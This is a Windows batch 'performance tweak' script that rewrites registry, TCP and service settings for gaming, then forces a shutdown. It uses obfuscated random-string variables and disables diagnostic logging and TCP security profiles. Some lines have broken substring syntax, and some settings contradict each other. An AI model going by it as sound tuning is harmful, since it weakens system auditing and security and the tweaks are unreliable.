reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\HolographicDevice" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsClient" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsProxy" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Mellanox-Kernel" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-AssignedAccess-Trace" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Setup" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\NBSMBLOGGER" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\PEAuthLog" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\RdrLog" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ReadyBoot" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatform" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SetupPlatformTel" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SocketHeciServer" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SpoolerLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TCPIPLOGGER" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TileStore" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Tpm" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\TPMProvisioningService" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\UBPM" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog" /v "Start" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WFP-IPsec Trace" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSession" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiDriverIHVSessionRepro" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WiFiSession" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WinPhoneCritical" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Credssp" /v "DebugLogLevel" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
cls
:smol
title smol
if not exist "%%REALHEARTHEARTHEARTREAL:~1,1%%REALHEARTHEARTREALREAL:~6,1%%REALHEARTHEARTREALHEART:~3,1%%REALHEARTHEARTREALREAL:~3,1%%REALREALHEARTHEARTHEART:~3,1%%REALHEARTHEARTREALREAL:~3,1%%REALREALHEARTHEARTHEART:~7,1%%REALHEARTHEARTREALREAL:~4,1%%REALHEARTHEARTHEARTREAL:~0,1%%REALREALHEARTHEARTHEART:~0,1%%REALHEARTHEARTREALHEART:~3,1%%\Desktop\QuickBoostOptionalTweaks" mkdir %%REALHEARTHEARTHEARTREAL:~1 1%%REALHEARTHEARTREALREAL:~6 1%%REALHEARTHEARTREALHEART:~3 1%%REALHEARTHEARTREALREAL:~3 1%%REALREALHEARTHEARTHEART:~3 1%%REALHEARTHEARTREALREAL:~3 1%%REALREALHEARTHEARTHEART:~7 1%%REALHEARTHEARTREALREAL:~4 1%%REALHEARTHEARTHEARTREAL:~0 1%%REALREALHEARTHEARTHEART:~0 1%%REALHEARTHEARTREALHEART:~3 1%%\Desktop\QuickBoostOptionalTweaks
explorer.exe %%REALHEARTHEARTHEARTREAL:~1 1%%REALHEARTHEARTREALREAL:~6 1%%REALHEARTHEARTREALHEART:~3 1%%REALHEARTHEARTREALREAL:~3 1%%REALREALHEARTHEARTHEART:~3 1%%REALHEARTHEARTREALREAL:~3 1%%REALREALHEARTHEARTHEART:~7 1%%REALHEARTHEARTREALREAL:~4 1%%REALHEARTHEARTHEARTREAL:~0 1%%REALREALHEARTHEARTHEART:~0 1%%REALHEARTHEARTREALHEART:~3 1%%\Desktop\QuickBoostOptionalTweaks

pause
:LowPing
title LowPing
@echo off
Set HEARTREALHEARTREALHEART=1W0TEcSy
Set HEARTHEARTREALHEARTREAL=4sJiRnmM
Set HEARTHEARTHEARTREALREAL=qBA3GpC5
Set REALHEARTREALREALREAL=O2eUQfIV
Set HEARTREALREALREALHEART=YhKbHtoX
Set HEARTREALHEARTREALREAL=r7NdlZvj
Set REALHEARTHEARTHEARTREALHEART=wFPDLk8
Set REALREALHEARTREALREALHEART=9agzu6x
cls
@echo off
@echo
ipconfig /flushdns
@echo
@echo off
netsh int tcp set global autotuninglevel=normal
netsh interface 6to4 set state disabled
netsh int isatap set state disable
netsh int tcp set global timestamps=disabled
netsh int tcp set heuristics disabled
netsh int tcp set global chimney=disabled
netsh int tcp set global ecncapability=disabled
netsh int tcp set global rsc=disabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set security mpp=disabled
netsh int tcp set security profiles=disabled
netsh int ip set global icmpredirects=disabled
netsh int tcp set security mpp=disabled profiles=disabled
netsh int ip set global multicastforwarding=disabled
netsh int tcp set supplemental internet congestionprovider=ctcp
netsh interface teredo set state disabled
netsh winsock reset
netsh int isatap set state disable
netsh int ip set global taskoffload=disabled
netsh int ip set global neighborcachelimit=4096
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
PowerShell Disable-NetAdapterLso -Name "*"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterPowerManagement -Name $adapter.Name -ErrorAction SilentlyContinue}"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterLso -Name $adapter.Name -ErrorAction SilentlyContinue}"
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_SZ /d "ffffffff" /f
REG ADD HKey_Local_Machine\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ /v TcpAckFrequency /t REG_DWORD /d 0 /f
REG ADD HKey_Local_Machine\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\ /v TCPNoDelay /t REG_DWORD /d 0 /f
taskkill /f /im explorer.exe
start explorer.exe
Reg.exe add "HKCR\NetworkProxy" /v "V2CSPNodePath" /t REG_SZ /d "./Vendor/MSFT/NetworkProxy" /f
Reg.exe add "HKCR\NetworkProxy" /v "WAPNodeProcessor" /t REG_SZ /d "{FB11047A-4051-4d1d-9DCA-C80C5DF98D70}" /f
:TweaksFPS2
title TweaksFPS
@echo off
Set REALREALHEARTREALREAL=9MNA5aXb
Set REALHEARTHEARTREALHEART=IfBHZ6Oo
Set HEARTHEARTREALREALHEART=JpwCjtl2
Set REALHEARTREALHEARTREALHEART=vKSUxuFs
Set REALREALREALREALREALHEART=nTGQ0zch
Set HEARTHEARTHEARTHEARTREALREAL=YePrWmiV
Set HEARTHEARTHEARTHEARTHEARTREAL=7D14E3y
Set HEARTREALHEARTHEARTREALHEARTREAL=qg8kRdL
cls
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
pause
:Summerboyz2
title Summerboyz
@echo off
Set REALHEARTHEARTREALREAL=dqt38bZl
Set REALREALREALHEARTREALHEART=y7G2wKAu
Set HEARTHEARTHEARTHEARTREALREAL=WBM5mF1i
Set HEARTHEARTREALHEARTHEARTREAL=0NsPOXav
Set REALREALHEARTHEARTREALREAL=9QRxU6CY
Set REALHEARTHEARTHEARTHEARTREAL=k4oLSjIV
Set HEARTHEARTHEARTREALREALREAL=DrcTEfn
Set REALREALHEARTHEARTHEARTHEART=pJhzgeH
cls
@echo off
title PARK NETWORK
echo.
echo Adding more ram for applications in system memory caching to improve microstuttering
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
echo Paging executive is used to load system files such as kernel and hardware drivers to the page file when needed. Disable will force run into not virtual memory
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
echo Disabling Windows attempt to save as much RAM as possible  such as sharing pages for images  copy-on-write for data pages  and compression
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingCombining" /t REG_DWORD /d "1" /f
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
@echo off
echo Applying SystemProfile (GPU and Network) Tweaks.
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
echo Enabling Hardware Accelerated GPU Scheduling
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /F /V "HwSchMode" /T REG_DWORD /d "2"
cls
rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!
rem https://support.microsoft.com/en-us/windows/fix-wi-fi-connection-issues-in-windows-9424a1f7-6a3b-65a6-4d78-7f07eee84d2c
rem Complete Internet Repair  - https://www.rizonesoft.com/downloads/complete-internet-repair
rem Windows Repair Toolbox - https://windows-repair-toolbox.com
rem TCP Optimizer - www.speedguide.net/downloads.php
rem www.tenforums.com/network-sharing/2806-slow-network-throughput-windows-10-a.html#post553305
rem Network Connection Status Indicator (NCSI) - HKLM\System\CurrentControlSet\Services\NlaSvc\Parameters\Internet
reg add "HKLM\Software\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator" /v "NoActiveProbe" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v "EnableActiveProbing" /t REG_DWORD /d "1" /f
reg add "HKLM\System\CurrentControlSet\Services\BFE" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\System\CurrentControlSet\Services\Dnscache" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\System\CurrentControlSet\Services\MpsSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\System\CurrentControlSet\Services\WinHttpAutoProxySvc" /v "Start" /t REG_DWORD /d "3" /f
sc config Dhcp start= auto
sc config DPS start= auto
sc config lmhosts start= auto
sc config NlaSvc start= auto
sc config nsi start= auto
sc config RmSvc start= auto
sc config Wcmsvc start= auto
sc config WdiServiceHost start= demand
sc config Winmgmt start= auto
sc config NcbService start= demand
sc config ndu start= demand
sc config Netman start= demand
sc config netprofm start= demand
sc config WlanSvc start= auto
sc config WwanSvc start= demand
net start DPS
net start nsi
net start NlaSvc
net start Dhcp
net start Wcmsvc
net start RmSvc
pause
::Realheart Script
Set REALHEARTHEARTHEARTREAL=lnwYkOpt
Set HEARTREALREALREALHEART=LqhFm8Jf
Set HEARTHEARTHEARTREALHEART=9IGdeNaS
Set REALHEARTREALREALREAL=KuHXxsD7
Set REALHEARTREALHEARTREAL=bUR6c4M0
Set HEARTHEARTREALHEARTREALHEART=Zo2BgjiP
Set REALREALHEARTHEARTREALHEART=zCrE1WA
Set HEARTHEARTHEARTREALHEARTREAL=5QV3yTv
cls
echo shutdown
pause
shutdown -s -t 3 -c "shutdown ."
